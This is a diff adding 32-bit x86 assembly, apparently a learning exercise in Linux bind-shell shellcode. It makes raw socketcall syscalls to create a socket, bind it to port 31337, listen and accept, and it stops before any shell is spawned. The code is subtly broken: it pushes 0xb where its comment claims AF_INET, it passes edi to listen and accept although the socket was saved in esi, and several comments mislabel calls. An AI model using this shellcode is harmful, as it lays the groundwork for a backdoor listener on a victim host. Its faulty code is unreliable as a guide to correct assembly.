@@ -1,0 +1,62 @@
+BITS 32
+
+; we will use ebx as the type of the socketcall and ecx for the pointer for the socket's call argument array 
+
+;the procedure:
+	;first call syscall for the socketcall #102 by pushing it's value in the stack  
+	;second pop the eax it stores the value of the socketcall and also fitting the who rigister because we pushed BYTE and it's 32 bit 
+	;third we zero out all rigister by xor them by themselfs
+	;fourth we will determine the type of socketcall by ebx and pushing the argument to the socket's call by ecx 
+	;fifth then move the pointer to args from esp to ecx 
+section .text
+global _start
+_start:
+; s = socket(2, 1, 0)
+push BYTE 0x66; syscall for the socketcall #102 
+pop eax 
+cdq ; Zero out edx for use as a null DWORD 
+xor ebx, ebx 
+inc ebx ; increament ebx for the type of syscall = 1 = socket()
+push edx ; first argument from the right
+push BYTE 0x1 ; second argument from the right = SOCK_STREAM
+push BYTE 0x2 ; third argument from the right = AF_INET
+mov ecx, esp ; move the pointer to the arguments from esp to ecx 
+int 0x80; After syscall eax has value of s 
+mov esi, eax ; save the value of s into esi 
+
+;bind(s, [2, 31337. 0], 16)
+push BYTE 0x66; syscall for the socketcall #102 
+pop eax 
+inc ebx ; increament ebx for the type of syscall = 1 = bind()
+push edx; the middle arg first from rigth push 0
+push WORD 0x697a;  the middle arg second from rigth push 31337
+push WORD 0xb; the middle arg third from rigth push = AF_INET
+mov ecx, esp ; now the ecx hold the pointer for the middle args 
+push BYTE 0x16 ; from the right of the whole arguments  sizeof(server struct) = 16
+push ecx; oush the middle args pointer 
+push esi; the socket file descriptor 
+mov ecx, esp; ecx = has the argmunt array bind(s, [2, 31337. 0], 16)
+int 0x80 ; call bind eax = 0 on success 
+
+;lisnten (s, 0)
+mov BYTE al, 0x66 ; we move here because eax would be 0 After bind 
+inc ebx
+inc ebx 
+push  ebx; args{BACKLOG = 4
+push edi ;   sockfd = edi  }
+mov ecx, esp ; puth the args pointer to ecx 
+int 0x80 ; call bind eax = 0 on success
+
+;c = accept(s, 0, 0)
+mov BYTE al, 0x66 ; we move here because eax would be 0 After bind 
+inc ebx 
+push edx;  argv{  socklen = 0
+push edx;  sockaddr ptr = NULL
+push edi;       s}
+mov ecx, esp ; puth the args pointer to ecx 
+int 0x80 ; eax will store the value of accept in c 
+
+
+
+
+
